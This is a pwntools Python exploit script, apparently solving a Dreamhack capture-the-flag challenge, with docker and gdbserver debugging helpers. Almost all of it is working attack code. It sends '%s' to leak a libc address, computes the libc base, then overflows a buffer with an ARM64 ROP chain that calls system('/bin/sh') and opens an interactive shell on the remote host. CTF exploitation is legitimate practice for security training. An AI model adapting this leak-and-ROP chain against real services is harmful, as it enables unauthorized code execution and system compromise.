#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./root/lib/libc.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

local_port = 5000

localscript = '''
file %s
define rerun
    !docker exec -u root -i debug_container bash -c "kill -9 \\$(pidof gdbserver) &"
    !docker exec -u root -i debug_container bash -c "gdbserver :9090 --attach \\$(pidof chall) &"
end
define con
    target remote :9090
end
''' % exe.path

gdbscript = '''
b *main
continue
'''

info = lambda msg: log.info(msg)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sna = lambda p, msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sn = lambda p, data: p.sendline(str(data).encode())
s = lambda p, data: p.send(data)


def conn():
    if args.LOCAL:
        r = process("./run.sh")
        # r = remote("localhost", local_port)
    elif args.GDB:
        r = process("./debug_run.sh")
        gdb.attach (target=('localhost', 1234), exe=exe.path, gdbscript=gdbscript)
        # r = gdb.debug([exe.path], gdbscript, env=dict(SHELL='/bin/bash'))
    elif args.REMOTE:
        r = remote("host8.dreamhack.games", 12588)

    return r

def debug_container(p):
    if args.LOCAL:
        gdbserver_cmd = "docker exec -u root -i debug_container bash -c".split()
        gdbserver_cmd.append("gdbserver :9090 --attach $(pidof prob)")
        process(gdbserver_cmd)
        
        # gdb.attach(('0.0.0.0', 9090), exe=exe.path, gdbscript=localscript + gdbscript)
        pause()


def main():
    p = conn()
    if args.LOCAL and args.GDB:
        debug_container(p)
    
    sa (p, b'your name > ', b'%s')
    p.recvuntil (b'Hi! ')
    leak = u64 (p.recvline()[:-1].ljust (8, b'\x00'))
    info (f"The leak is: {hex (leak)}")
    libc.address = leak - 0xa6e60
    info (f'The address of libc is: {hex (libc.address)}')

    # 0x000000000003ba90 : ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x30 ; ret

    instr = libc.address + 0x3ba90

    payload = b'A' * 0x100 + p64 (0) + p64 (instr) + p64 (libc.sym['system']) + b'A' * 0x10 + p64 (next (libc.search (b'/bin/sh')))
    sa (p, b'> ', payload)

    p.interactive()


if __name__ == "__main__":
    main()